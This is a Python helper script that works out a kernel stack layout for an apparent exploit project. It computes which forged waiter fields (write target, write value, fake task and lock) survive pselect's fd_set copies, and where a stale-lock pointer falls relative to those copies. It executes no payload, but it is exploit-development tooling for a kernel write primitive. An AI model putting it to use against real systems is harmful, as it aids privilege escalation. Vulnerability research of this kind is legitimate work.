#!/usr/bin/env python3
"""Offline audit of the Violin pselect fd-set word mapping.

This does not invoke a device, syscall, compiler, or payload.  It mirrors the
index arithmetic in src/fops.c::prepare_pselect_fdsets() and reports which
forged waiter words survive the three fd_set windows for the configured nfds.
"""

from __future__ import annotations

import argparse
import json
import math
import re
from pathlib import Path


CUSTOM_WORDS = {
    2: "write_value",
    3: "zero",
    4: "write_target",
    5: "parent_or_value",
    6: "value_or_zero",
    7: "zero_or_target",
    8: "waiter_prio",
    9: "zero",
    10: "fake_task",
    11: "fake_lock",
    12: "zero",
    13: "zero",
}

# Same-build raw-kernel stack equation for the explicit pselect6 path.  These
# are offsets from the core_sys_select frame base (Q0), not user pointers.
PSELECT_FDSET_BASE_OFF = 0x80
PSELECT_STALE_LOCK_OFF = 0xD8

SLIDE_WORDS = {
    0: "tree_pc",
    1: "tree_right",
    2: "tree_left",
    3: "tree_prio",
    4: "tree_deadline",
    5: "pi_parent",
    6: "pi_right",
    7: "pi_left",
    8: "pi_prio",
    9: "pi_deadline",
    10: "task",
    11: "lock",
    12: "wake_state",
    13: "ww_ctx",
}


def read_nfds(path: Path) -> int:
    text = path.read_text(encoding="utf-8")
    match = re.search(r"^\s*#define\s+PSELECT_ROUTE_NFDS\s+(\d+)\s*$", text, re.MULTILINE)
    if not match:
        raise ValueError(f"PSELECT_ROUTE_NFDS not found in {path}")
    return int(match.group(1))


def mapping(
    nfds: int, shift: int = 0, words: dict[int, str] | None = None
) -> dict[str, object]:
    words = CUSTOM_WORDS if words is None else words
    bits_per_word = 64
    words_per_set = math.ceil(nfds / bits_per_word)
    rows: list[dict[str, object]] = []
    destinations: dict[str, list[str]] = {"in": [], "out": [], "ex": [], "dropped": []}

    for waiter_word, name in words.items():
        global_word = shift + waiter_word
        set_idx, word_idx = divmod(global_word, words_per_set)
        if set_idx == 0:
            set_name = "in"
        elif set_idx == 1:
            set_name = "out"
        elif set_idx == 2:
            set_name = "ex"
        else:
            set_name = "dropped"
        destination = f"{set_name}[{word_idx}]"
        rows.append(
            {
                "waiter_word": waiter_word,
                "name": name,
                "global_word": global_word,
                "set": set_name,
                "word": word_idx,
                "destination": destination,
            }
        )
        destinations[set_name].append(name)

    destination_names: dict[str, list[str]] = {}
    for row in rows:
        if row["set"] == "dropped":
            continue
        destination_names.setdefault(str(row["destination"]), []).append(str(row["name"]))
    collisions = {
        destination: names
        for destination, names in destination_names.items()
        if len(names) > 1
    }
    target_survives = any(row["name"] == "write_target" and row["set"] != "dropped" for row in rows)
    value_survives = any(row["name"] == "write_value" and row["set"] != "dropped" for row in rows)
    min_words = math.ceil((max(words) + shift + 1) / 3)
    all_words_survive = not destinations["dropped"] and not collisions
    min_nfds = (min_words - 1) * bits_per_word + 1
    return {
        "nfds": nfds,
        "shift": shift,
        "bits_per_word": bits_per_word,
        "words_per_set": words_per_set,
        "rows": rows,
        "destinations": destinations,
        "collisions": collisions,
        "write_target_survives": target_survives,
        "write_value_survives": value_survives,
        "all_words_survive": all_words_survive,
        "minimum_nfds_for_all_words": min_nfds,
        "ok": (
            all_words_survive
            if "write_target" not in words
            else target_survives and value_survives and all_words_survive
        ),
    }


def stale_lock_copy_window(nfds: int) -> dict[str, object]:
    """Locate the known stale-lock slot relative to core_sys_select Q0.

    The slot can be outside the three user fd-set copies (the configured
    nfds=64 case), or can fall inside one of those copies for larger nfds.
    Being inside a copy is not by itself a proof of failure: the same qword
    may be consumed first as an fd bitmask and later as a stale pointer.  The
    result is therefore deliberately descriptive rather than a hard gate.
    """
    words_per_set = math.ceil(nfds / 64)
    bytes_per_set = words_per_set * 8
    sets: list[dict[str, object]] = []
    names = ("in", "out", "ex")
    containing: dict[str, object] | None = None
    for set_idx, name in enumerate(names):
        start = PSELECT_FDSET_BASE_OFF + set_idx * bytes_per_set
        end = start + bytes_per_set
        row: dict[str, object] = {
            "set": name,
            "start_off": start,
            "end_off_exclusive": end,
        }
        if start <= PSELECT_STALE_LOCK_OFF < end:
            word = (PSELECT_STALE_LOCK_OFF - start) // 8
            row["contains_stale_lock"] = True
            row["stale_lock_word"] = word
            containing = {
                "set": name,
                "word": word,
                "destination": f"{name}[{word}]",
            }
        else:
            row["contains_stale_lock"] = False
        sets.append(row)
    result_sets: list[dict[str, object]] = []
    for set_idx, name in enumerate(("res_in", "res_out", "res_ex")):
        start = PSELECT_FDSET_BASE_OFF + (set_idx + 3) * bytes_per_set
        result_sets.append(
            {
                "set": name,
                "start_off": start,
                "end_off_exclusive": start + bytes_per_set,
                "contains_stale_lock": start <= PSELECT_STALE_LOCK_OFF < start + bytes_per_set,
            }
        )
    return {
        "q0_offset": PSELECT_STALE_LOCK_OFF,
        "fdset_base_offset": PSELECT_FDSET_BASE_OFF,
        "sets": sets,
        "result_sets": result_sets,
        "stale_lock_copy_overlap": containing is not None,
        "stale_lock_in_result_copy": any(
            row["contains_stale_lock"] for row in result_sets
        ),
        "containing_set_word": containing,
        "interpretation": (
            "dual_use_candidate"
            if containing is not None
            else "outside_fdset_copy"
        ),
    }


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--common", type=Path, required=True)
    parser.add_argument("--output", type=Path)
    args = parser.parse_args()

    nfds = read_nfds(args.common)
    result = {
        "common": str(args.common),
        "configured_nfds": nfds,
        "configured_stale_lock_copy_window": stale_lock_copy_window(nfds),
        "comparison_stale_lock_copy_windows": {
            str(candidate): stale_lock_copy_window(candidate)
            for candidate in (64, 193, 257, 320, 705)
        },
        "violin_shift_0": mapping(nfds, shift=0),
        "shift_1_comparison": mapping(nfds, shift=1),
        "slide_shift_0": mapping(nfds, shift=0, words=SLIDE_WORDS),
        "slide_shift_1_comparison": mapping(nfds, shift=1, words=SLIDE_WORDS),
    }
    encoded = json.dumps(result, indent=2, sort_keys=True) + "\n"
    if args.output:
        args.output.write_text(encoded, encoding="utf-8")
    print(encoded, end="")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
